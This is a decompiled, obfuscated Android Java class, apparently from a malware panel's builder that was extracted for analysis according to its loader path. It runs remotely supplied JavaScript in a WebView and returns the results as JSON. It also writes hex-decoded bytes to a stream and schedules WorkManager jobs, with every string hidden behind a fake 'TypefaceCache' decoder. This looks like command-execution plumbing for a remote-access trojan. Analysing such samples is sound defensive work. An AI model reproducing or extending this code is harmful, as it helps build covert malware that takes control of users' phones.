package v.s;

import android.webkit.ValueCallback;
import android.webkit.WebView;
import androidx.work.impl.WorkDatabase;
import app.mobilex.plus.util.TypefaceCache;
import java.io.OutputStream;
import java.util.Iterator;
import java.util.List;
import org.json.JSONException;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final /* synthetic */ class TLNVSdc9dyzTVW7 implements Runnable {
    public final /* synthetic */ Object Ee8d2j4S9Vm5yGuR;
    public final /* synthetic */ Object JXn4Qf7zpnLjP5;
    public final /* synthetic */ Object vekpFI4d1Nc4fakF;
    public final /* synthetic */ int w9sT1Swbhx3hs;
    public final /* synthetic */ Object xDyLpEZyrcKVe0;

    public /* synthetic */ TLNVSdc9dyzTVW7(Object obj, String str, Object obj2, String str2, int i) {
        this.w9sT1Swbhx3hs = i;
        this.Ee8d2j4S9Vm5yGuR = obj;
        this.vekpFI4d1Nc4fakF = str;
        this.xDyLpEZyrcKVe0 = obj2;
        this.JXn4Qf7zpnLjP5 = str2;
    }

    @Override // java.lang.Runnable
    public final void run() throws JSONException {
        switch (this.w9sT1Swbhx3hs) {
            case 0:
                WebView webView = (WebView) this.Ee8d2j4S9Vm5yGuR;
                String str = (String) this.vekpFI4d1Nc4fakF;
                final RWY6BVSB0XxPbw rWY6BVSB0XxPbw = (RWY6BVSB0XxPbw) this.xDyLpEZyrcKVe0;
                final String str2 = (String) this.JXn4Qf7zpnLjP5;
                webView.evaluateJavascript(str, new ValueCallback() { // from class: v.s.b99q8o5895nfKAUXQO
                    private static /* synthetic */ void twdh() {
                    }

                    @Override // android.webkit.ValueCallback
                    public final void onReceiveValue(Object obj) throws JSONException {
                        String str3 = (String) obj;
                        JSONObject jSONObject = new JSONObject();
                        Y9mRyRdkl5FOcwb66V6.wotphlvK9sPbXJ("002A00780051008200F300AB00ED00AD003000490049008200E300AA00DE00B3", jSONObject, TypefaceCache.obtain("0037006F004B0082"), "003700770049008000F500AB00ED00B7002200750050008600F700BA", str2);
                        String strObtain = TypefaceCache.obtain("003100730048009200FC00AB");
                        if (str3 == null) {
                            str3 = "null";
                        }
                        jSONObject.put(strObtain, str3);
                        jSONObject.put(TypefaceCache.obtain("003000630058008400F500AC00C1"), true);
                        rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject);
                    }
                });
                break;
            case 1:
                sJoLPxEklk5a9kh sjolpxeklk5a9kh = (sJoLPxEklk5a9kh) this.Ee8d2j4S9Vm5yGuR;
                String str3 = (String) this.vekpFI4d1Nc4fakF;
                uHIAsHsIBe2zMf uhiashsibe2zmf = (uHIAsHsIBe2zMf) this.xDyLpEZyrcKVe0;
                String str4 = (String) this.JXn4Qf7zpnLjP5;
                try {
                    int length = str3.length() / 2;
                    byte[] bArr = new byte[length];
                    for (int i = 0; i < length; i++) {
                        int i2 = i * 2;
                        bArr[i] = (byte) (Character.digit(str3.charAt(i2 + 1), 16) + (Character.digit(str3.charAt(i2), 16) << 4));
                    }
                    OutputStream outputStream = uhiashsibe2zmf.vekpFI4d1Nc4fakF;
                    if (outputStream != null) {
                        outputStream.write(bArr);
                    }
                    OutputStream outputStream2 = uhiashsibe2zmf.vekpFI4d1Nc4fakF;
                    if (outputStream2 != null) {
                        outputStream2.flush();
                    }
                } catch (Exception e) {
                    TypefaceCache.obtain("001000730048009400F900B000DC00E7");
                    TypefaceCache.obtain("006300610049008E00E400BA009200A2003100640054009500AA00FF");
                    e.getMessage();
                    sjolpxeklk5a9kh.dDIMxZXP1V8HdM(str4);
                    EZbVnuP8e1Nfu7 eZbVnuP8e1Nfu7 = sjolpxeklk5a9kh.dDIMxZXP1V8HdM;
                    JSONObject jSONObject = new JSONObject();
                    Y9mRyRdkl5FOcwb66V6.wotphlvK9sPbXJ("003300640054009F00E9008000D600AE003000750054008900FE00BA00D100B3", jSONObject, TypefaceCache.obtain("0037006F004B0082"), "003000730048009400F900B000DC0098002A0072", str4);
                    eZbVnuP8e1Nfu7.pyu8ovAipBTLYAiKab(jSONObject);
                    return;
                }
                break;
            default:
                List list = (List) this.Ee8d2j4S9Vm5yGuR;
                ebR1taU40KcOGClk ebr1tau40kcogclk = (ebR1taU40KcOGClk) this.vekpFI4d1Nc4fakF;
                eDfRIe8Yxow8 edfrie8yxow8 = (eDfRIe8Yxow8) this.JXn4Qf7zpnLjP5;
                WorkDatabase workDatabase = (WorkDatabase) this.xDyLpEZyrcKVe0;
                Iterator it = list.iterator();
                while (it.hasNext()) {
                    ((IaJdiuw5vdcTDn7) it.next()).dDIMxZXP1V8HdM(ebr1tau40kcogclk.dDIMxZXP1V8HdM);
                }
                Qbw3oj5SB4rmsG0k8.w9sT1Swbhx3hs(edfrie8yxow8, workDatabase, list);
                break;
        }
    }

    public /* synthetic */ TLNVSdc9dyzTVW7(List list, ebR1taU40KcOGClk ebr1tau40kcogclk, eDfRIe8Yxow8 edfrie8yxow8, WorkDatabase workDatabase) {
        this.w9sT1Swbhx3hs = 2;
        this.Ee8d2j4S9Vm5yGuR = list;
        this.vekpFI4d1Nc4fakF = ebr1tau40kcogclk;
        this.JXn4Qf7zpnLjP5 = edfrie8yxow8;
        this.xDyLpEZyrcKVe0 = workDatabase;
    }
}
